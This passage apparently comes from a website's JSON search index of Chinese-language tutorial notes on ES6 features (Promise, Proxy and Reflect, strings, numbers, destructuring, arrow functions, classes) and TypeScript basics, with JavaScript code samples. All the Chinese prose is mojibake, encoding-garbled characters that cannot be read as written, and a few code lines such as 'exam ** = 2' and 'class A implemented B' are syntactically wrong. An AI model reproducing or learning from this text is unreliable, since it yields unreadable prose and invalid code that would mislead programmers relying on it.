ç¬¬äºŒä¸ªå‚æ•°æ˜¯ Promise æ‰§è¡Œå¤±è´¥æ—¶çš„å›è°ƒï¼Œä¸¤ä¸ªå‡½æ•°åªä¼šæœ‰ä¸€ä¸ªè¢«è°ƒç”¨ then æ–¹æ³•çš„ç‰¹ç‚¹ åœ¨ JavaScript äº‹ä»¶é˜Ÿåˆ—çš„å½“å‰è¿è¡Œå®Œæˆä¹‹å‰ï¼Œå›è°ƒå‡½æ•°æ°¸è¿œä¸ä¼šè¢«è°ƒç”¨: const p = new Promise(function(resolve,reject){ resolve('success'); }); p.then(function(value){ console.log(value); }); console.log('first'); // first // success é€šè¿‡ .then å½¢å¼æ·»åŠ çš„å›è°ƒå‡½æ•°ï¼Œä¸è®ºä»€ä¹ˆæ—¶å€™ï¼Œéƒ½ä¼šè¢«è°ƒç”¨ã€‚ é€šè¿‡å¤šæ¬¡è°ƒç”¨ .thenï¼Œå¯ä»¥æ·»åŠ å¤šä¸ªå›è°ƒå‡½æ•°ï¼Œå®ƒä»¬ä¼šæŒ‰ç…§æ’å…¥é¡ºåºå¹¶ä¸”ç‹¬ç«‹è¿è¡Œã€‚ then æ–¹æ³•å°†è¿”å›ä¸€ä¸ª resolved æˆ– rejected çŠ¶æ€çš„ Promise å¯¹è±¡ç”¨äºé“¾å¼è°ƒç”¨ï¼Œä¸” Promise å¯¹è±¡çš„å€¼å°±æ˜¯è¿™ä¸ªè¿”å›å€¼ã€‚ then æ–¹æ³•æ³¨æ„ç‚¹ ç®€ä¾¿çš„ Promise é“¾å¼ç¼–ç¨‹æœ€å¥½ä¿æŒæ‰å¹³åŒ–ï¼Œä¸è¦åµŒå¥— Promiseã€‚ æ³¨æ„æ€»æ˜¯è¿”å›æˆ–ç»ˆæ­¢ Promise é“¾","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-ES6-Promise-object.html","loc":"/yq-doc-source-docs-front-end-ES6-Promise-object.html"},{"title":"Reflect ä¸ Proxy","text":"https://www.runoob.com/w3cnote/es6-reflect-proxy.html å³åå°„ä¸ä»£ç† Proxy Proxy å¯ä»¥å¯¹ç›®æ ‡å¯¹è±¡çš„è¯»å–ã€å‡½æ•°è°ƒç”¨ç­‰æ“ä½œè¿›è¡Œæ‹¦æˆªï¼Œç„¶åè¿›è¡Œæ“ä½œå¤„ç†. å®ƒä¸ç›´æ¥æ“ä½œå¯¹è±¡ï¼Œè€Œæ˜¯åƒä»£ç†æ¨¡å¼ï¼Œé€šè¿‡å¯¹è±¡çš„ä»£ç†å¯¹è±¡è¿›è¡Œæ“ä½œï¼Œåœ¨è¿›è¡Œè¿™äº›æ“ä½œæ—¶ï¼Œå¯ä»¥æ·»åŠ ä¸€äº›éœ€è¦çš„é¢å¤–æ“ä½œã€‚ ç”¨æ³•: let proxy = new Proxy(target, handler) target: éœ€è¦ä»£ç†çš„æºå¯¹è±¡ handler: ä»£ç†å¤„ç†æ“ä½œ, è‹¥ä¸ºç©ºå³ä¸åšä»£ç†æ‹¦æˆªå¤„ç† å¯¹è±¡ä»£ç†ç”¨ä¾‹: let target = { name: 'Tom', age: 24 } let handler = { get: function(target, key) { console.log('getting '+key); return target[key]; // ä¸æ˜¯target.key }, set: function(target, key, value) { console.log('setting '+key); target[key] = value; } } let proxy = new Proxy(target, handler) proxy.name // å®é™…æ‰§è¡Œ handler.get proxy.age = 25 // å®é™…æ‰§è¡Œ handler.set // getting name // setting age // 25 å®ä¾‹æ–¹æ³• erty æ“ä½œ ptor å±æ€§ Reflect Reflect å¯ä»¥ç”¨äºè·å–ç›®æ ‡å¯¹è±¡çš„è¡Œä¸ºï¼Œå®ƒä¸ Object ç±»ä¼¼ï¼Œä½†æ˜¯æ›´æ˜“è¯»ï¼Œä¸ºæ“ä½œå¯¹è±¡æä¾›äº†ä¸€ç§æ›´ä¼˜é›…çš„æ–¹å¼. å®ƒçš„æ–¹æ³•ä¸ Proxy æ˜¯å¯¹åº”çš„ã€‚ ES6 ä¸­å°† Object çš„ä¸€äº›æ˜æ˜¾å±äºè¯­è¨€å†…éƒ¨çš„æ–¹æ³•ç§»æ¤åˆ°äº† Reflect å¯¹è±¡ä¸Šï¼ˆå½“å‰æŸäº›æ–¹æ³•ä¼šåŒæ—¶å­˜åœ¨äº Object å’Œ Reflect å¯¹è±¡ä¸Šï¼‰ï¼Œ æœªæ¥çš„æ–°æ–¹æ³•ä¼šåªéƒ¨ç½²åœ¨ Reflect å¯¹è±¡ä¸Šã€‚ Reflect å¯¹è±¡å¯¹æŸäº›æ–¹æ³•çš„è¿”å›ç»“æœè¿›è¡Œäº†ä¿®æ”¹ï¼Œä½¿å…¶æ›´åˆç†ã€‚ Reflect å¯¹è±¡ä½¿ç”¨å‡½æ•°çš„æ–¹å¼å®ç°äº† Object çš„å‘½ä»¤å¼æ“ä½œã€‚ é™æ€æ–¹æ³• Reflect.set(target, name, value, receiver) å°† target çš„ name å±æ€§è®¾ç½®ä¸º valueã€‚è¿”å›å€¼ä¸º boolean ï¼Œtrue è¡¨ç¤ºä¿®æ”¹æˆåŠŸï¼Œfalse è¡¨ç¤ºå¤±è´¥ã€‚å½“ target ä¸ºä¸å­˜åœ¨çš„å¯¹è±¡æ—¶ï¼Œä¼šæŠ¥é”™ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-ES6-Reflect-and-PROXY.html","loc":"/yq-doc-source-docs-front-end-ES6-Reflect-and-PROXY.html"},{"title":"ES6 å­—ç¬¦ä¸²æ“ä½œ","text":"å­ä¸²çš„è¯†åˆ« ES6 ä¹‹å‰åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦åŒ…å«å­ä¸²ï¼Œç”¨ indexOf æ–¹æ³•ï¼ŒES6 æ–°å¢äº†å­ä¸²çš„è¯†åˆ«æ–¹æ³• includes()ï¼šè¿”å›å¸ƒå°”å€¼ï¼Œåˆ¤æ–­æ˜¯å¦æ‰¾åˆ°å‚æ•°å­—ç¬¦ä¸² startsWith()ï¼šè¿”å›å¸ƒå°”å€¼ï¼Œåˆ¤æ–­å‚æ•°å­—ç¬¦ä¸²æ˜¯å¦åœ¨åŸå­—ç¬¦ä¸²çš„å¤´éƒ¨ endsWith()ï¼šè¿”å›å¸ƒå°”å€¼ï¼Œåˆ¤æ–­å‚æ•°å­—ç¬¦ä¸²æ˜¯å¦åœ¨åŸå­—ç¬¦ä¸²çš„å°¾éƒ¨ å­—ç¬¦ä¸²é‡å¤ å­—ç¬¦ä¸²è¡¥å…¨ padStartï¼šè¿”å›æ–°çš„å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºç”¨å‚æ•°å­—ç¬¦ä¸²ä»å¤´éƒ¨ï¼ˆå·¦ä¾§ï¼‰è¡¥å…¨åŸå­—ç¬¦ä¸²ã€‚ padEndï¼šè¿”å›æ–°çš„å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºç”¨å‚æ•°å­—ç¬¦ä¸²ä»å°¾éƒ¨ï¼ˆå³ä¾§ï¼‰è¡¥å…¨åŸå­—ç¬¦ä¸²ã€‚ æ¨¡æ¿å­—ç¬¦ä¸²","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-ES6-String-operation.html","loc":"/yq-doc-source-docs-front-end-ES6-String-operation.html"},{"title":"æ•°å€¼","text":"å¸¸è§æ•°å€¼è¡¨ç¤º äºŒè¿›åˆ¶è¡¨ç¤ºæ³•æ–°å†™æ³•: å‰ç¼€ 0b æˆ– 0B console.log(0b11 === 3); // true console.log(0B11 === 3); // true å…«è¿›åˆ¶è¡¨ç¤ºæ³•æ–°å†™æ³•: å‰ç¼€ 0o æˆ– 0O console.log(0o11 === 9); // true console.log(0O11 === 9); // true å¸¸é‡ Number.EPSILON Number.EPSILON å±æ€§è¡¨ç¤º 1 ä¸å¤§äº 1 çš„æœ€å°æµ®ç‚¹æ•°ä¹‹é—´çš„å·®. å®ƒçš„å€¼æ¥è¿‘äº 2.2204460492503130808472633361816E-16ï¼Œæˆ–è€… 2-52. æµ‹è¯•æ•°å€¼æ˜¯å¦åœ¨è¯¯å·®èŒƒå›´å†…: 0.1 + 0.2 === 0.3; // false // åœ¨è¯¯å·®èŒƒå›´å†…å³è§†ä¸ºç›¸ç­‰ equal = (Math.abs(0.1 - 0.3 + 0.2) < Number.EPSILON); // true å±æ€§ç‰¹æ€§: writableï¼šfalse enumerableï¼šfalse configurableï¼šfalse æœ€å¤§/æœ€å°å®‰å…¨æ•´æ•° å®‰å…¨æ•´æ•° å®‰å…¨æ•´æ•°è¡¨ç¤ºåœ¨ JavaScript ä¸­èƒ½å¤Ÿç²¾ç¡®è¡¨ç¤ºçš„æ•´æ•°ï¼Œ å®‰å…¨æ•´æ•°çš„èŒƒå›´åœ¨ 2 çš„ -53 æ¬¡æ–¹åˆ° 2 çš„ 53 æ¬¡æ–¹ä¹‹é—´ï¼ˆä¸åŒ…æ‹¬ä¸¤ä¸ªç«¯ç‚¹ï¼‰ï¼Œ è¶…è¿‡è¿™ä¸ªèŒƒå›´çš„æ•´æ•°æ— æ³•ç²¾ç¡®è¡¨ç¤ºã€‚ æœ€å¤§å®‰å…¨æ•´æ•° å®‰å…¨æ•´æ•°èŒƒå›´çš„ä¸Šé™ï¼Œå³ 2 çš„ 53 æ¬¡æ–¹å‡ 1 . å¦‚: Number.MAX_SAFE_INTEGER + 1 === Number.MAX_SAFE_INTEGER + 2; // true Number.MAX_SAFE_INTEGER === Number.MAX_SAFE_INTEGER + 1; // false Number.MAX_SAFE_INTEGER - 1 === Number.MAX_SAFE_INTEGER - 2; // false æœ€å°å®‰å…¨æ•´æ•° å®‰å…¨æ•´æ•°èŒƒå›´çš„ä¸‹é™ï¼Œå³ 2 çš„ 53 æ¬¡æ–¹å‡ 1 çš„è´Ÿæ•°. å¦‚: Number.MIN_SAFE_INTEGER + 1 === Number.MIN_SAFE_INTEGER + 2; // false Number.MIN_SAFE_INTEGER === Number.MIN_SAFE_INTEGER - 1; // false Number.MIN_SAFE_INTEGER - 1 === Number.MIN_SAFE_INTEGER - 2; // true å±æ€§ç‰¹æ€§: writableï¼šfalse enumerableï¼šfalse configurableï¼šfalse æ–¹æ³• Number å¯¹è±¡æ–°æ–¹æ³• Math å¯¹è±¡çš„æ‰©å±• ES6 åœ¨ Math å¯¹è±¡ä¸Šæ–°å¢äº† 17 ä¸ªæ•°å­¦ç›¸å…³çš„é™æ€æ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•åªèƒ½åœ¨ Math ä¸­è°ƒç”¨ã€‚ æ™®é€šè®¡ç®— æ•°å­—å¤„ç† åˆ¤æ–­ å¯¹æ•°æ–¹æ³• åŒæ›²å‡½æ•°æ–¹æ³• Math.sinh(x): ç”¨äºè®¡ç®—åŒæ›²æ­£å¼¦ Math.cosh(x): ç”¨äºè®¡ç®—åŒæ›²ä½™å¼¦ Math.tanh(x): ç”¨äºè®¡ç®—åŒæ›²æ­£åˆ‡ Math.asinh(x): ç”¨äºè®¡ç®—ååŒæ›²æ­£å¼¦ Math.acosh(x): ç”¨äºè®¡ç®—ååŒæ›²ä½™å¼¦ Math.atanh(x): ç”¨äºè®¡ç®—ååŒæ›²æ­£åˆ‡ æŒ‡æ•°è¿ç®—ç¬¦ æŒ‡æ•°è¿ç®—ç¬¦: 1 ** 2; // 1 // å³ç»“åˆï¼Œä»å³è‡³å·¦è®¡ç®— 2 ** 2 ** 3; // 256 // **= let exam = 2; exam ** = 2; // 4","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-ES6-Value.html","loc":"/yq-doc-source-docs-front-end-ES6-Value.html"},{"title":"å˜é‡å£°æ˜/èµ‹å€¼","text":"æ™®é€šèµ‹å€¼ let å£°æ˜çš„å˜é‡åªåœ¨ let å‘½ä»¤æ‰€åœ¨çš„ä»£ç å—å†…æœ‰æ•ˆ, åªèƒ½å£°æ˜ä¸€æ¬¡ var åœ¨å…¨å±€èŒƒå›´å†…æœ‰æ•ˆ, å¯å¤šæ¬¡å£°æ˜ const å£°æ˜ä¸€ä¸ªåªè¯»çš„å¸¸é‡ï¼Œä¸€æ—¦å£°æ˜ï¼Œå¸¸é‡çš„å€¼å°±ä¸èƒ½æ”¹å˜, ä¸€æ—¦å£°æ˜å¿…é¡»åˆå§‹åŒ–. const å…¶å®ä¿è¯çš„ä¸æ˜¯å˜é‡çš„å€¼ä¸å˜ï¼Œè€Œæ˜¯ä¿è¯å˜é‡æŒ‡å‘çš„å†…å­˜åœ°å€æ‰€ä¿å­˜çš„æ•°æ®ä¸å…è®¸æ”¹åŠ¨. å¯¹äºç®€å•ç±»å‹ï¼ˆæ•°å€¼ numberã€å­—ç¬¦ä¸² string ã€å¸ƒå°”å€¼ booleanï¼‰,å€¼å°±ä¿å­˜åœ¨å˜é‡æŒ‡å‘çš„é‚£ä¸ªå†…å­˜åœ°å€ï¼Œ å› æ­¤ const å£°æ˜çš„ç®€å•ç±»å‹å˜é‡ç­‰åŒäºå¸¸é‡. è€Œå¤æ‚ç±»å‹ï¼ˆå¯¹è±¡ objectï¼Œæ•°ç»„ arrayï¼Œå‡½æ•° functionï¼‰ï¼Œå˜é‡æŒ‡å‘çš„å†…å­˜åœ°å€å…¶å®æ˜¯ä¿å­˜äº†ä¸€ä¸ªæŒ‡å‘å®é™…æ•°æ®çš„æŒ‡é’ˆ, æ‰€ä»¥ const åªèƒ½ä¿è¯æŒ‡é’ˆæ˜¯å›ºå®šçš„ï¼Œè‡³äºæŒ‡é’ˆæŒ‡å‘çš„æ•°æ®ç»“æ„å˜ä¸å˜å°±æ— æ³•æ§åˆ¶äº†ï¼Œæ‰€ä»¥ä½¿ç”¨ const å£°æ˜å¤æ‚ç±»å‹å¯¹è±¡æ—¶è¦æ…é‡ã€‚ è§£æ„èµ‹å€¼ è§£æ„èµ‹å€¼æ˜¯å¯¹èµ‹å€¼è¿ç®—ç¬¦çš„æ‰©å±•ã€‚ ä»–æ˜¯ä¸€ç§é’ˆå¯¹æ•°ç»„æˆ–è€…å¯¹è±¡è¿›è¡Œæ¨¡å¼åŒ¹é…ï¼Œç„¶åå¯¹å…¶ä¸­çš„å˜é‡è¿›è¡Œèµ‹å€¼ æœ‰ä¸¤éƒ¨åˆ†ç»„æˆ: è§£æ„çš„æºï¼Œè§£æ„èµ‹å€¼è¡¨è¾¾å¼çš„å³è¾¹éƒ¨åˆ†; è§£æ„çš„ç›®æ ‡ï¼Œè§£æ„èµ‹å€¼è¡¨è¾¾å¼çš„å·¦è¾¹éƒ¨åˆ†. å¦‚: let [a, , b] = [1, 2, 3]; // a = 1 // b = 3 let [a, ...b] = [1, 2, 3]; //a = 1 //b = [2, 3] åœ¨æ•°ç»„çš„è§£æ„ä¸­ï¼Œè§£æ„çš„ç›®æ ‡è‹¥ä¸ºå¯éå†å¯¹è±¡ï¼Œçš†å¯è¿›è¡Œè§£æ„èµ‹å€¼ã€‚å¯éå†å¯¹è±¡å³å®ç° Iterator æ¥å£çš„æ•°æ®: let [a, b, c, d, e] = 'hello'; // a = 'h' // b = 'e' // c = 'l' // d = 'l' // e = 'o' å¸¦é»˜è®¤å€¼çš„æƒ…å†µ: let [a = 3, b = a] = []; // a = 3, b = 3 let [a = 3, b = a] = [1]; // a = 1, b = 1 let [a = 3, b = a] = [1, 2]; // a = 1, b = 2","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-ES6-Variable-statement.html","loc":"/yq-doc-source-docs-front-end-ES6-Variable-statement.html"},{"title":"ES6 å‡½æ•°","text":"å‡½æ•°å‚æ•°çš„æ‰©å±• ä¸å®šå‚æ•°ç”¨æ¥è¡¨ç¤ºä¸ç¡®å®šå‚æ•°ä¸ªæ•°ï¼Œå½¢å¦‚ï¼Œ...å˜é‡åï¼Œ ç”±...åŠ ä¸Šä¸€ä¸ªå…·åå‚æ•°æ ‡è¯†ç¬¦ç»„æˆã€‚å…·åå‚æ•°åªèƒ½æ”¾åœ¨å‚æ•°ç»„çš„æœ€åï¼Œå¹¶ä¸”æœ‰ä¸”åªæœ‰ä¸€ä¸ªä¸å®šå‚æ•°ã€‚ åŸºæœ¬ç”¨æ³•: function f(...values){ console.log(values.length); } f(1,2); //2 f(1,2,3,4); //4 ç®­å¤´å‡½æ•° ç®­å¤´å‡½æ•°æä¾›äº†ä¸€ç§æ›´åŠ ç®€æ´çš„å‡½æ•°ä¹¦å†™æ–¹å¼ã€‚åŸºæœ¬è¯­æ³•æ˜¯: å‚æ•° => å‡½æ•°ä½“ å½“ç®­å¤´å‡½æ•°æ²¡æœ‰å‚æ•°æˆ–è€…æœ‰å¤šä¸ªå‚æ•°ï¼Œè¦ç”¨ () æ‹¬èµ·æ¥; å½“ç®­å¤´å‡½æ•°å‡½æ•°ä½“æœ‰å¤šè¡Œè¯­å¥ï¼Œç”¨ {} åŒ…è£¹èµ·æ¥ï¼Œè¡¨ç¤ºä»£ç å— å½“ç®­å¤´å‡½æ•°è¦è¿”å›å¯¹è±¡çš„æ—¶å€™ï¼Œä¸ºäº†åŒºåˆ†äºä»£ç å—ï¼Œè¦ç”¨ () å°†å¯¹è±¡åŒ…è£¹èµ·æ¥: var f = (id,name) => ({id: id, name: name}); f(6,2); // {id: 6, name: 2} æ³¨è§£ æ²¡æœ‰ thisã€superã€arguments å’Œ new.target ç»‘å®š: var func = () => { // ç®­å¤´å‡½æ•°é‡Œé¢æ²¡æœ‰ this å¯¹è±¡ï¼Œ // æ­¤æ—¶çš„ this æ˜¯å¤–å±‚çš„ this å¯¹è±¡ï¼Œå³ Window console.log(this) } func(55) // Window ç®­å¤´å‡½æ•°ä½“ä¸­çš„ this å¯¹è±¡ï¼Œæ˜¯å®šä¹‰å‡½æ•°æ—¶çš„å¯¹è±¡ï¼Œè€Œä¸æ˜¯ä½¿ç”¨å‡½æ•°æ—¶çš„å¯¹è±¡: function fn(){ setTimeout(()=>{ // å®šä¹‰æ—¶ï¼Œthis ç»‘å®šçš„æ˜¯ fn ä¸­çš„ this å¯¹è±¡ console.log(this.a); },0) } var a = 20; // fn çš„ this å¯¹è±¡ä¸º {a: 18} fn.call({a: 18}); // 18 ä¸å¯ä»¥ä½œä¸ºæ„é€ å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½ä½¿ç”¨ new å‘½ä»¤ï¼Œå¦åˆ™ä¼šæŠ¥é”™","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-ES6-function.html","loc":"/yq-doc-source-docs-front-end-ES6-function.html"},{"title":"ES6 ç±»","text":"åœ¨ES6ä¸­ï¼Œclass (ç±»)ä½œä¸ºå¯¹è±¡çš„æ¨¡æ¿è¢«å¼•å…¥ï¼Œå¯ä»¥é€šè¿‡ class å…³é”®å­—å®šä¹‰ç±»ã€‚ class çš„æœ¬è´¨æ˜¯ functionã€‚ å®ƒå¯ä»¥çœ‹ä½œä¸€ä¸ªè¯­æ³•ç³–ï¼Œè®©å¯¹è±¡åŸå‹çš„å†™æ³•æ›´åŠ æ¸…æ™°ã€æ›´åƒé¢å‘å¯¹è±¡ç¼–ç¨‹çš„è¯­æ³•ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-ES6-kind.html","loc":"/yq-doc-source-docs-front-end-ES6-kind.html"},{"title":"Promise","text":"ä¸ºä»€ä¹ˆè¦ä½¿ç”¨ Promise ä¼ ç»Ÿçš„å¼‚æ­¥è¯·æ±‚å¦‚æœå­˜åœ¨å¤šæ¬¡å¤„ç†, é‚£ä¹ˆç»“æœå°±ä¼šæ˜¯åµŒå¥—è°ƒç”¨: const read_model = require('model'); const _file = './name.txt' read_model.readFile(_file,'utf8',function(err,data){ read_model.readFile(data, 'utf8',function(err,data){ read_model.readFile(data,'utf8',function(err,data){ console.log(data); }); }); }); ä½¿ç”¨ Promise å¯ä»¥å°†å…¶æ›´æ”¹ä¸ºé“¾å¼è°ƒç”¨: function read(filename) { return new Promise((resolve, reject) => { read_model.read_model(filename, 'utf-8', (err, data) => { if (err) {reject(err);} resolve(data); }); }); } read(_file).then((data) => { return read(data); }).then((data) => { return read(data); }).then((data) => { console.log(data); }, err => { console.log(err); } ); æ˜¾è‘—è§£å†³äº†å¼‚æ­¥ç¼–ç é£æ ¼é—®é¢˜, åµŒå¥—è°ƒç”¨çš„å¯è¯»æ€§ç»´æŠ¤æ€§è¾ƒå·®. ä¸šç•Œæ¯”è¾ƒè‘—åçš„å®ç° Promise çš„ç±»åº“æœ‰ bluebirdã€Qã€ES6-Promiseã€‚ æ„é€ è¯´æ˜ æ„é€ è¯´æ˜: new Promise((resolve, reject) => {}) resolve è°ƒç”¨æˆåŠŸåæ‰§è¡Œ, å¦‚æœæ˜¯å‡½æ•° resolve(success_data). ä½¿ç”¨ value ä¿å­˜æˆåŠŸçŠ¶æ€çš„å€¼. reject è°ƒç”¨å¤±è´¥åæ‰§è¡Œ, å¦‚æœæ˜¯å‡½æ•° reject(err_msg). ä½¿ç”¨ reason ä¿å­˜å¤±è´¥çŠ¶æ€çš„å€¼. Promise çš„çŠ¶æ€ä¸å¯é€†ï¼ŒåŒæ—¶è°ƒç”¨ resolve å‡½æ•°å’Œ reject å‡½æ•°ï¼Œé»˜è®¤ä¼šé‡‡å–ç¬¬ä¸€æ¬¡è°ƒç”¨çš„ç»“æœã€‚ promise æœ‰ä¸‰ä¸ªçŠ¶æ€ï¼špendingï¼Œfulfilledï¼Œor rejected. é»˜è®¤çŠ¶æ€æ˜¯ pending; åªèƒ½ä»pendingåˆ°rejected, æˆ–è€…ä»pendingåˆ°fulfilledï¼ŒçŠ¶æ€ä¸€æ—¦ç¡®è®¤ï¼Œå°±ä¸ä¼šå†æ”¹å˜; è°ƒç”¨ Promise , ä¼šè¿”å›ä¸€ä¸ª Promise å¯¹è±¡ promise å¿…é¡»æœ‰ä¸€ä¸ªthenæ–¹æ³•ï¼Œthen æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯ promise æˆåŠŸçš„å›è°ƒ onFulfilled, å’Œ promise å¤±è´¥çš„å›è°ƒ onRejected. ä¹Ÿå¯ç§°ä¸º thenable å¦‚æœè°ƒç”¨ then æ—¶ï¼Œpromise å·²ç»æˆåŠŸï¼Œåˆ™æ‰§è¡ŒonFulfilledï¼Œå‚æ•°æ˜¯promiseçš„valueï¼› å¦‚æœè°ƒç”¨ then æ—¶ï¼Œpromise å·²ç»å¤±è´¥ï¼Œé‚£ä¹ˆæ‰§è¡ŒonRejected, å‚æ•°æ˜¯promiseçš„reasonï¼› å¦‚æœ then ä¸­æŠ›å‡ºäº†å¼‚å¸¸ï¼Œé‚£ä¹ˆå°±ä¼šæŠŠè¿™ä¸ªå¼‚å¸¸ä½œä¸ºå‚æ•°ï¼Œä¼ é€’ç»™ä¸‹ä¸€ä¸ª then çš„å¤±è´¥çš„å›è°ƒonRejectedï¼› æ³¨è§£ (resolve, reject) => {} è¢«ç§°ä¸º executor å‡½æ•° è‡ªå®šä¹‰ Promise , å®ç°éœ€å‚è€ƒ: Promises/A+è§„èŒƒ : è¡¥å…… Promise è¡¨ç¤ºä¸€ä¸ªå¼‚æ­¥æ“ä½œçš„æœ€ç»ˆç»“æœï¼Œä¸ä¹‹è¿›è¡Œäº¤äº’çš„æ–¹å¼ä¸»è¦æ˜¯ then æ–¹æ³•ï¼Œ è¯¥æ–¹æ³•æ³¨å†Œäº†ä¸¤ä¸ªå›è°ƒå‡½æ•°ï¼Œç”¨äºæ¥æ”¶ promise çš„ç»ˆå€¼æˆ–æœ¬ promise ä¸èƒ½æ‰§è¡Œçš„åŸå› ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-ES6-promise.html","loc":"/yq-doc-source-docs-front-end-ES6-promise.html"},{"title":"åŸºç¡€è¯­æ³•","text":"TypeScript ç¨‹åºç”±ä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ç»„æˆ: æ¨¡å— å‡½æ•° å˜é‡ è¯­å¥å’Œè¡¨è¾¾å¼ æ³¨é‡Š ä»£ç çš„è¿è¡Œ, å¦‚æœ‰ä¸€ä¸ª eg.ts , éœ€è¦å…ˆè½¬æ¢ä¸º js ä»£ç : tsc eg.ts æ³¨è§£ tscé€šè¿‡nodeçš„npmå®‰è£…: npm install typescript -g ç„¶åå°±æ˜¯æ™®é€šçš„ js é‚£æ ·æ‰§è¡Œ: node eg.js ä¸€äº›ç‰¹ç‚¹ åŒºåˆ†å¤§å°å†™ ç©ºæ ¼åˆ¶è¡¨ç¬¦ä¸æ•æ„Ÿ åˆ†å·å¯é€‰ æ³¨é‡Š // æˆ–è€… /* */","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-TypeScript-Basic-grammar.html","loc":"/yq-doc-source-docs-front-end-TypeScript-Basic-grammar.html"},{"title":"TypeScriptåŸºç¡€ç±»å‹","text":"any: ä»»æ„ç±»å‹ number: æ•°å­—ç±»å‹, åŒç²¾åº¦ 64 ä½æµ®ç‚¹å€¼ã€‚å®ƒå¯ä»¥ç”¨æ¥è¡¨ç¤ºæ•´æ•°å’Œåˆ†æ•° string: å­—ç¬¦ä¸², å¯ä½¿ç”¨ å•/åŒ/åå¼•å·å®šä¹‰, å…¶ä¸­åå¼•å·å¯ç”¨äºå®šä¹‰å¤šè¡Œæ–‡æœ¬ä»¥åŠä½¿ç”¨å˜é‡(ç”¨$), ç±»ä¼¼äºPythonçš„ f boolean: true, false enum: æšä¸¾ void null: è¡¨ç¤ºå¯¹è±¡å€¼ç¼ºå¤±ã€‚è¡¨ç¤ºä¸€ä¸ªç©ºå¯¹è±¡å¼•ç”¨. ç”¨ typeof æ£€æµ‹ null è¿”å›æ˜¯ object undefined: ç”¨äºåˆå§‹åŒ–å˜é‡ä¸ºä¸€ä¸ªæœªå®šä¹‰çš„å€¼. undefined æ˜¯ä¸€ä¸ªæ²¡æœ‰è®¾ç½®å€¼çš„å˜é‡. typeof ä¸€ä¸ªæ²¡æœ‰å€¼çš„å˜é‡ä¼šè¿”å› undefined never: never æ˜¯å…¶å®ƒç±»å‹ï¼ˆåŒ…æ‹¬ null å’Œ undefinedï¼‰çš„å­ç±»å‹ï¼Œä»£è¡¨ä»ä¸ä¼šå‡ºç°çš„å€¼ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-TypeScript-Basic-type.html","loc":"/yq-doc-source-docs-front-end-TypeScript-Basic-type.html"},{"title":"tsçš„é—®å·ä¸å¹å·","text":"é—®å· tsä¸­æœ‰å››ç§ä½¿ç”¨æ–¹å¼ ä¸‰ç›®è¿ç®—ç¬¦ ä¾‹: const isCN = country === 'China' ? true : false; å‡½æ•°å¯é€‰å‚æ•°(å¯ä»¥ç†è§£ä¸ºå‚æ•°è‡ªåŠ¨åŠ ä¸Š undefined) ä¾‹: function getUsername(firstName: string, lastName?: string){} ç±»ä¼¼ä¸: function getUsername(firstName: string, lastName: string | undefined){} å¯é€‰æˆå‘˜ï¼ˆç±»ã€æ¥å£ï¼‰ ä¾‹: class A { name?: string } interface B { name?: string } é“¾åˆ¤æ–­è¿ç®—ç¬¦ï¼ˆES2020 optional chaining operatorï¼‰ ä¾‹: const firstName = message?.body?.user?.firstName || 'default'; æ„Ÿå¹å· ä¸‰ä¸ªåœ°æ–¹ä¼šç”¨åˆ°: ä¸€å…ƒè¿ç®—ç¬¦:: ä¾‹: const isShow = !isModalHide(); æˆå‘˜(å¼ºè°ƒéç©º/å·²æœ‰å€¼) ä¾‹: interface B { name?: string } // å› ä¸ºæ¥å£Bé‡Œé¢nameè¢«å®šä¹‰ä¸ºå¯ç©ºçš„å€¼ï¼Œä½†æ˜¯å®é™…æƒ…å†µæ˜¯ä¸ä¸ºç©ºçš„ï¼Œ // é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åœ¨classé‡Œé¢ä½¿ç”¨ï¼ï¼Œé‡æ–°å¼ºè°ƒäº†nameè¿™ä¸ªä¸ä¸ºç©ºå€¼ class A implemented B { name!: string } TypeScript 2.7 å¼•å…¥äº†ä¸€ä¸ªæ–°çš„æ§åˆ¶ç±»å‹æ£€æŸ¥çš„æ ‡è®° --strictPropertyInitialization , è¿™ä¸ªå‚æ•°è§„å®šæ¯ä¸ªå®ä¾‹å±æ€§éƒ½ä¼šåœ¨æ„é€ å‡½æ•°é‡Œæˆ–ä½¿ç”¨å±æ€§åˆå§‹åŒ–å™¨èµ‹å€¼: class Person { name: string; country: string; constructor() { this.name = 'Louis'; } } åœ¨ strictPropertyInitialization æ‰“å¼€çš„æƒ…å†µä¸‹ï¼Œä¸Šé¢çš„ä»£ç ç¼–è¯‘å™¨ä¼šæŠ¥é”™: error TS2564: Property 'country' has no initializer and is not definitely assigned in the constructor. å¦‚æœæˆ‘ä»¬ä¸æƒ³åœ¨åˆå§‹åŒ–çš„æ—¶å€™ä¸ºcountryèµ‹å€¼ï¼Œæ­¤æ—¶å°±å¯ä»¥ç”¨ ! ä¿®é¥°è¯¥å±æ€§: class Person { name: string; country!: string; constructor() { this.name = 'Louis'; } } éç©ºæ–­è¨€æ“ä½œç¬¦(Non-null Assertion Operator) åœ¨ç¼–è¾‘å™¨ä¸­å½“å‚æ•°å¯èƒ½ä¸ºç©º(null or undefined)æ—¶, è°ƒç”¨å¯èƒ½ä¼šæœ‰è­¦å‘Š/é”™è¯¯, è¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨ ! è¡¨ç¤ºä¸€å®šä¸ä¸ºç©º(ä¸ä¼šæ”¹å˜ä»£ç çš„è¿è¡Œæ—¶è¡Œä¸º): function liveDangerously(x?: number | null) { // No error console.log(x!.toFixed()); 